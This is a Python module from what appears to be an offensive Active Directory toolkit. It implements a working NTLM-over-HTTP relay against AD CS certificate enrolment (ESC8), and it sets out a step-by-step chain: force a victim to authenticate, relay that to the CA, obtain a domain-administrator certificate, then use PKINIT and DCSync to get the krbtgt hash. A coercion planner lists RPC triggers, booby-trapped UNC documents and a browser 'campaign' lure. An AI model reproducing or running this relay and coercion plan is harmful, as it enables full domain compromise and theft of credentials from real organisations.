# ============================================================================
# FILE: core/relay.py
# ============================================================================
"""NTLM relay over HTTP: the half of the AD CS chain that was missing.

A certificate is accepted as possession. The CA's HTTP enrolment endpoint accepts NTLM, and
NTLM has no channel binding over plain HTTP - so if a machine authenticates to US instead of to
the CA, we forward that authentication to the CA and the CA issues the certificate to whoever
asked. The requester never learns a password; they never authenticate to anything; they just
stand in the middle of an authentication that was going to happen anyway.

That is ESC8, and it ends at "a certificate for a domain administrator" - after which PKINIT
gets a TGT and DCSync gets the krbtgt hash, which is the AD equivalent of the IdP signing key.

What this module provides: the relay itself (parse the NTLM messages, hold the challenge, forward
the response) and the trigger plan (how the victim's machine ends up authenticating to us).

What it needs, and the module says so:
  * a target that offers NTLM (see `core.adcs.probe` - `ntlm_offered`)
  * no Extended Protection (EPA) and no HTTPS-with-channel-binding on that target
  * a victim that authenticates to us: a coercion RPC, or a document/link that makes Windows
    resolve a UNC path to our listener (the WebClient service, port 80)
  * SMB signing does not matter here: this is HTTP, where signing was never in play

Everything is a normal HTTP exchange, which is why it works where SMB relay does not.
"""
import base64
import contextlib
import json
import struct
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

__all__ = ["NtlmMessage", "parse_ntlm", "ntlm_type", "RelayError", "Relay", "plan",
           "coerce_plan", "describe", "ESC8_HINT"]

ESC8_HINT = ("a 401 that offers NTLM on the CA's /certsrv/ endpoint is the precondition; "
             "Extended Protection or HTTPS-with-channel-binding removes it")

# The NTLM signature every message starts with.
NTLM_SIG = b"NTLMSSP\x00"


class RelayError(RuntimeError):
    """A refusal the CLI can report verbatim."""


class NtlmMessage:
    """One NTLM message: its type, and the fields worth reading."""

    __slots__ = ("type", "raw", "user", "domain", "workstation", "flags", "challenge")

    def __init__(self, msg_type=0, raw=b"", user="", domain="", workstation="", flags=0,
                 challenge=b""):
        self.type = msg_type
        self.raw = raw
        self.user = user
        self.domain = domain
        self.workstation = workstation
        self.flags = flags
        self.challenge = challenge

    def to_dict(self):
        return {"type": self.type, "user": self.user, "domain": self.domain,
                "workstation": self.workstation,
                "challenge": base64.b64encode(self.challenge).decode() if self.challenge else "",
                "bytes": len(self.raw)}

    def __repr__(self):
        return f"<NtlmMessage type={self.type} {self.domain}\\{self.user}>"


def _u16(blob, offset):
    return struct.unpack_from("<H", blob, offset)[0]


def _u32(blob, offset):
    return struct.unpack_from("<I", blob, offset)[0]


def _security_buffer(blob, offset):
    """(length, max_length, buffer_offset) of an NTLM security buffer."""
    length, _max, buf_off = struct.unpack_from("<HHI", blob, offset)
    return length, buf_off


def _read_utf16(blob, length, offset):
    if not length or offset + length > len(blob):
        return ""
    try:
        return blob[offset:offset + length].decode("utf-16-le", "replace")
    except Exception:
        return ""


def parse_ntlm(value):
    """Parse an `Authorization: NTLM <b64>` value (or raw bytes) into an NtlmMessage."""
    if value is None:
        return None
    if isinstance(value, NtlmMessage):
        return value
    if isinstance(value, (bytes, bytearray)):
        raw = bytes(value)
    else:
        text = str(value).strip()
        if text.lower().startswith("ntlm "):
            text = text[5:].strip()
        if not text:
            return None
        try:
            raw = base64.b64decode(text + "=" * (-len(text) % 4))
        except Exception:
            return None
    if not raw.startswith(NTLM_SIG) or len(raw) < 12:
        return None
    msg_type = _u32(raw, 8)
    msg = NtlmMessage(msg_type=msg_type, raw=raw)
    if msg_type == 2:
        # CHALLENGE_MESSAGE: the 8-byte server challenge sits right after the header. A short
        # message (12 <= len < 24) used to raise struct.error out of here, which the relay's
        # `except RelayError` does not catch - one packet dropped the connection with no HTTP
        # response at all.
        if len(raw) < 32:
            return None
        msg.challenge = raw[24:32]
        msg.flags = _u32(raw, 20)
    elif msg_type == 3:
        # AUTHENTICATE_MESSAGE layout: LM@12, NT@20, DOMAIN@28, USER@36, WORKSTATION@44,
        # session key@52, flags@60. (The challenge message uses different offsets - using those
        # here reads a domain name out of the header and prints garbage as the victim's
        # identity, which is the one field this whole relay exists to report.)
        try:
            ln, off = _security_buffer(raw, 28)
            msg.domain = _read_utf16(raw, ln, off)
            ln, off = _security_buffer(raw, 36)
            msg.user = _read_utf16(raw, ln, off)
            ln, off = _security_buffer(raw, 44)
            msg.workstation = _read_utf16(raw, ln, off)
            msg.flags = _u32(raw, 60) if len(raw) >= 64 else 0
        except Exception:
            pass
    return msg


def ntlm_type(value):
    """Just the message type: 1 (negotiate), 2 (challenge), 3 (authenticate), 0 (not NTLM)."""
    msg = parse_ntlm(value)
    return msg.type if msg else 0


class Relay:
    """The relay: a listener that holds one authentication open and forwards it.

    One authentication at a time per session key, and the response from the target is handed
    straight back to the requester - that is what makes the certificate (or whatever the target
    returns) land in the requester's hands rather than ours.
    """

    def __init__(self, target_url, host="0.0.0.0", port=8088, path="/", on_auth=None,
                 timeout=15, session_headers=None):
        self.target_url = str(target_url or "")
        self.host = host
        self.port = int(port or 8088)
        self.path = path or "/"
        self.on_auth = on_auth
        self.timeout = timeout
        self.session_headers = dict(session_headers or {})
        self.log = []
        self._challenges = {}
        self._lock = threading.Lock()
        self._httpd = None
        self._thread = None
        self._no_redirect = None
        self.relayed = 0

    # ---------------------------------------------------------------- target --
    def _target_request(self, auth_value=None, body=None, method="GET", path=None,
                        extra_headers=None):
        """One request to the target, with redirects DISABLED.

        Following a redirect re-sends `Authorization: NTLM <the victim's response>` to whatever
        host the target points at, and returns THAT host's 401 as if it came from the target -
        the relay would leak the authentication it exists to carry.
        """
        url = self.target_url.rstrip("/") + (path or self.path)
        headers = {"User-Agent": "Mozilla/5.0", "Connection": "close"}
        headers.update(self.session_headers)
        headers.update(extra_headers or {})
        if auth_value:
            headers["Authorization"] = f"NTLM {auth_value}"
        data = body.encode() if isinstance(body, str) else body
        req = urllib.request.Request(url, data=data, method=method, headers=headers)
        opener = self._opener()
        try:
            with opener.open(req, timeout=self.timeout) as r:
                return r.status, dict(r.headers), r.read(400000)
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers or {}), e.read(400000)
        except (urllib.error.URLError, TimeoutError, OSError) as e:
            raise RelayError(f"the target {url} is unreachable ({type(e).__name__})") from e

    def _opener(self):
        """An opener that refuses to follow redirects (see _target_request)."""
        if self._no_redirect is None:
            class _NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, *a, **kw):
                    return None
            self._no_redirect = urllib.request.build_opener(_NoRedirect)
        return self._no_redirect

    def handle_authorization(self, auth_value, method="GET", body=None, path=None,
                             extra_headers=None):
        """One step of the relay, given the client's `Authorization: NTLM ...`.

        Returns (status, headers, body, note) where the note says which step this was.
        """
        msg = parse_ntlm(auth_value)
        if msg is None:
            return None
        if msg.type == 1:
            # NEGOTIATE -> ask the TARGET for its challenge, and hand that to the client
            status, headers, _body = self._target_request(
                auth_value=base64.b64encode(msg.raw).decode(), method=method, path=path,
                body=body, extra_headers=extra_headers)
            challenge = _www_authenticate(headers)
            if not challenge:
                raise RelayError("the target did not answer with an NTLM challenge (status "
                                 f"{status}): it is not offering NTLM on that endpoint")
            with self._lock:
                self._challenges[_challenge_key(msg, challenge)] = time.time()
            self._record({"step": "challenge", "target_status": status})
            return status, {"WWW-Authenticate": challenge}, b"", "challenge"
        if msg.type == 3:
            # AUTHENTICATE -> forward it. Whatever the target returns IS the relay's result.
            # the BODY must travel with the authentication: the enrolment POST that asks for a
            # certificate is a POST, and a relay that forwards the auth without the body hands
            # the CA an empty request (the plan's own step 4)
            status, headers, body = self._target_request(
                auth_value=base64.b64encode(msg.raw).decode(), method=method, path=path,
                body=body, extra_headers=extra_headers)
            self.relayed += 1
            self._record({"step": "relay", "target_status": status, "user": msg.user,
                          "domain": msg.domain, "workstation": msg.workstation})
            if self.on_auth:
                with contextlib.suppress(Exception):
                    self.on_auth({"user": msg.user, "domain": msg.domain,
                                  "workstation": msg.workstation, "status": status,
                                  "bytes": len(body or b"")})
            return status, headers, body, "relay"
        return None

    def _record(self, row):
        row["ts"] = time.time()
        self.log.append(row)
        if len(self.log) > 500:
            del self.log[:-500]

    # ----------------------------------------------------------------- server --
    def handler_class(self):
        relay = self

        class _Handler(BaseHTTPRequestHandler):
            server_version = "Microsoft-IIS/10.0"
            sys_version = ""

            def log_message(self, fmt, *args):   # quiet: the relay's own log is the record
                return

            def _serve(self, method):
                auth = self.headers.get("Authorization", "")
                if not auth.lower().startswith("ntlm"):
                    self.send_response(401)
                    self.send_header("WWW-Authenticate", "NTLM")
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
                body = None
                length = self.headers.get("Content-Length")
                if length and length.isdigit() and int(length) <= 1_000_000:
                    body = self.rfile.read(int(length))
                try:
                    out = relay.handle_authorization(
                        auth, method=method, body=body, path=self.path,
                        extra_headers={k: v for k, v in self.headers.items()
                                       if k.lower() in ("content-type", "soapaction")})
                except RelayError as e:
                    self.send_response(502)
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    relay._record({"step": "error", "why": str(e)})
                    return
                if out is None:
                    self.send_response(400)
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
                status, headers, payload, _note = out
                self.send_response(status or 200)
                for key, value in (headers or {}).items():
                    if key.lower() in ("content-type", "www-authenticate", "location",
                                       "content-disposition", "set-cookie"):
                        self.send_header(key, value)
                payload = payload or b""
                self.send_header("Content-Length", str(len(payload)))
                self.end_headers()
                if payload:
                    self.wfile.write(payload)

            def do_GET(self):
                self._serve("GET")

            def do_POST(self):
                self._serve("POST")

            # The relay is the endpoint a WebDAV/WebClient trigger talks to, and that trigger
            # uses OPTIONS/PROPFIND/HEAD - methods the first version answered with a 501, i.e.
            # no WWW-Authenticate and therefore no authentication to relay at all.
            def do_HEAD(self):
                self._serve("HEAD")

            def do_OPTIONS(self):
                self._serve("OPTIONS")

            def do_PROPFIND(self):
                self._serve("PROPFIND")

            def do_MKCOL(self):
                self._serve("MKCOL")

            def do_PUT(self):
                self._serve("PUT")

            def do_DELETE(self):
                self._serve("DELETE")

        return _Handler

    def start(self):
        self._httpd = ThreadingHTTPServer((self.host, self.port), self.handler_class())
        self._httpd.daemon_threads = True
        self._thread = threading.Thread(target=self._httpd.serve_forever, daemon=True)
        self._thread.start()
        return self

    def stop(self):
        if self._httpd:
            with contextlib.suppress(Exception):
                self._httpd.shutdown()
                self._httpd.server_close()
        self._httpd = None

    def summary(self, limit=12):
        return {"relayed": self.relayed, "listening": f"{self.host}:{self.port}",
                "target": self.target_url, "log": self.log[-limit:]}


def _www_authenticate(headers):
    for key, value in (headers or {}).items():
        if key.lower() == "www-authenticate" and "ntlm" in str(value).lower():
            return str(value)
    return ""


def _challenge_key(negotiate, challenge):
    return base64.b64encode(challenge.encode() if isinstance(challenge, str) else challenge)[:24]


def plan(target_url, listen_port=8088, method="GET", target_path="/certsrv/certfnsh.asp"):
    """The ESC8 chain: coerce, relay, enrol, then use the certificate."""
    return {
        "target": target_url,
        "listen": f"0.0.0.0:{listen_port}",
        "target_path": target_path,
        "steps": [
            {"step": 1, "what": f"probe the CA ({target_url}{target_path}) for an NTLM offer",
             "how": "core.adcs.probe - `ntlm_offered` must be true, and EPA/channel binding "
                    "must be absent"},
            {"step": 2, "what": "make the victim's machine authenticate to US, not to the CA",
             "how": "core.relay.coerce_plan - an RPC coercion, or a document/link that makes "
                    "Windows resolve a UNC path to our listener on port 80"},
            {"step": 3, "what": "relay the NTLM exchange to the CA",
             "how": "core.relay.Relay.start() - the challenge comes from the CA, the response "
                    "comes from the victim, and the CA's answer goes back to the victim"},
            {"step": 4, "what": "the enrolment POST that asks for a certificate with a "
                                "chosen subject (ESC1 needs a template that allows it)",
             "how": "the relay carries it: the victim's authentication authorises the request"},
            {"step": 5, "what": "use the certificate: PKINIT for a TGT, then DCSync for the "
                                "krbtgt hash",
             "how": "the AD equivalent of the IdP signing key - it outlives every password "
                    "reset in the domain"},
        ],
        "why_it_works": ("NTLM over HTTP has no channel binding, so an authentication meant for "
                         "the CA is indistinguishable from one that reached it directly; SMB "
                         "signing, which stops SMB relay, is not in play at all"),
        "stops_it": [
            "Extended Protection for Authentication (EPA) on the enrolment endpoint",
            "HTTPS with channel binding (the IIS 'Require SSL + Extended Protection' pair)",
            "the WebClient service disabled on endpoints (kills the UNC trigger)",
            "disabling NTLM on the CA, or moving enrolment to HTTPS-only",
            "privileged tier separation: a CA that does not trust a workstation's "
            "authentication for enrolment",
        ],
        "visible": ("the CA's log shows an enrolment from the operator's address with the "
                    "victim's identity; the victim's machine shows an outbound 445/80 to a "
                    "host it has no business talking to"),
        "created": time.time(),
    }


def coerce_plan(victim_host="", listener="", webdav=True):
    """How the victim's machine ends up authenticating to the relay.

    Two families, and the second needs no vulnerability at all:
      * an RPC coercion (PetitPotam/PrinterBug/DFSCoerce class): the machine is told to
        authenticate to a UNC path it was given
      * a DOCUMENT: Word, Excel, Outlook, a `.url`, an `.lnk`, a `.searchConnector-ms`, or a
        plain `\\\\host@80\\x` path - Windows resolves it and the WebClient service sends the
        authentication over HTTP
    """
    who = victim_host or "<victim>"
    us = listener or "<relay-host>"
    # a UNC path carries the port as `host@port`, not `host:port`: the WebClient service reads
    # the `@80` form and sends the authentication over HTTP, which is what the relay wants
    unc_host = us.split(":")[0] if "@" not in us else us
    unc = f"\\\\{unc_host}@80\\x"
    return {
        "victim": who, "listener": us,
        "triggers": [
            {"kind": "document", "what": "a file that references a remote path",
             "detail": f"a UNC/WebDAV path such as {unc} (WebClient turns it into an "
                       "HTTP authentication, which is exactly what the relay wants)",
             "needs": "the WebClient service running (default on workstations)"},
            {"kind": "rpc", "what": "an RPC coercion",
             "detail": f"tell {who} to authenticate to {unc} through the EFSRPC / "
                       "MS-RPRN / DFS interfaces",
             "needs": "an RPC transport to the victim, and the interface not patched"},
            {"kind": "lure", "what": "the campaign itself",
             "detail": "the collector already runs in the victim's browser: a request that "
                       "makes the page resolve a remote path reaches the same service",
             "needs": "nothing beyond the campaign - this is why the relay pairs with it"},
        ],
        "note": ("the relay does not care which trigger fired: any authentication that arrives "
                 "at the listener is forwarded, and the answer goes back to the victim"),
        "created": time.time(),
    }


def describe(facts):
    if "steps" in (facts or {}):
        lines = [f"ESC8 relay plan -> {facts.get('target')} (listening {facts.get('listen')})"]
        for step in facts["steps"]:
            lines.append(f"  {step['step']}. {step['what']}")
            lines.append(f"     how: {step['how']}")
        lines.append(f"  why it works: {facts['why_it_works']}")
        lines.append("  stops it:")
        for item in facts["stops_it"]:
            lines.append(f"    - {item}")
        return "\n".join(lines)
    if "triggers" in (facts or {}):
        lines = [f"coercion plan: {facts.get('victim')} -> {facts.get('listener')}"]
        for trig in facts["triggers"]:
            lines.append(f"  [{trig['kind']}] {trig['what']}: {trig['detail']}")
            lines.append(f"     needs: {trig['needs']}")
        return "\n".join(lines)
    return f"relay: {json.dumps(facts, default=str)[:300]}"
